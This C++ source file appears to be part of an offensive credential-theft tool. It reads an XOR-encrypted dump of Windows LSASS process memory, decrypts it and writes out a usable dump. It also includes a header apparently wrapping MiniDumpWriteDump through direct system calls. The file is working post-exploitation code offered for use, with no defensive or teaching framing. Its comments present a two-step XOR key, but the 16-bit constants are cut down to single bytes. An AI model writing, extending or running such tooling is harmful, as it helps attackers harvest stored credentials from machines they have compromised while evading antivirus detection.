#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include "sysMDWD.h"
#include <search.h>
#include <algorithm>


void Decrypt(void* DumpBuffer, int BytesRead)
{
    // Cast the void pointer to a BYTE pointer for byte-level manipulation
    BYTE* buffer = reinterpret_cast<BYTE*>(DumpBuffer);

    for (int i = 0; i < BytesRead; i++)  // Corrected to avoid off-by-one error
    {
        buffer[i] = buffer[i] ^ 0x9A1C;  // First XOR with 0x9A1C
        buffer[i] = buffer[i] ^ 0x5B9C;  // Second XOR with 0x5B9C
    }
    printf("Successfully decrypted lsass memory dump.\n");
}

bool DecryptDumpFile(LPCWSTR inputFilePath, LPCWSTR outputFilePath)
{
    // Open the input file for reading
    HANDLE hInputFile = CreateFileW(inputFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hInputFile == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"Failed to open input file: " << inputFilePath << L" (Error: " << GetLastError() << L")\n";
        return false;
    }

    // Get the file size
    DWORD fileSize = GetFileSize(hInputFile, NULL);
    if (fileSize == INVALID_FILE_SIZE)
    {
        std::wcerr << L"Failed to get file size. (Error: " << GetLastError() << L")\n";
        CloseHandle(hInputFile);
        return false;
    }

    // Allocate memory for the file data
    BYTE* buffer = new BYTE[fileSize];
    DWORD bytesRead = 0;

    // Read the file into the buffer
    if (!ReadFile(hInputFile, buffer, fileSize, &bytesRead, NULL))
    {
        std::wcerr << L"Failed to read input file. (Error: " << GetLastError() << L")\n";
        delete[] buffer;
        CloseHandle(hInputFile);
        return false;
    }
    CloseHandle(hInputFile);

    // Decrypt the data
    Decrypt(buffer, bytesRead);

    // Open the output file for writing
    HANDLE hOutputFile = CreateFileW(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutputFile == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"Failed to create output file: " << outputFilePath << L" (Error: " << GetLastError() << L")\n";
        delete[] buffer;
        return false;
    }

    DWORD bytesWritten = 0;

    // Write the decrypted data to the output file
    if (!WriteFile(hOutputFile, buffer, bytesRead, &bytesWritten, NULL))
    {
        std::wcerr << L"Failed to write to output file. (Error: " << GetLastError() << L")\n";
        delete[] buffer;
        CloseHandle(hOutputFile);
        return false;
    }
    CloseHandle(hOutputFile);

    // Clean up
    delete[] buffer;

    std::wcout << L"Decrypted lsass dump file written to: " << outputFilePath << L"\n";
    return true;
}

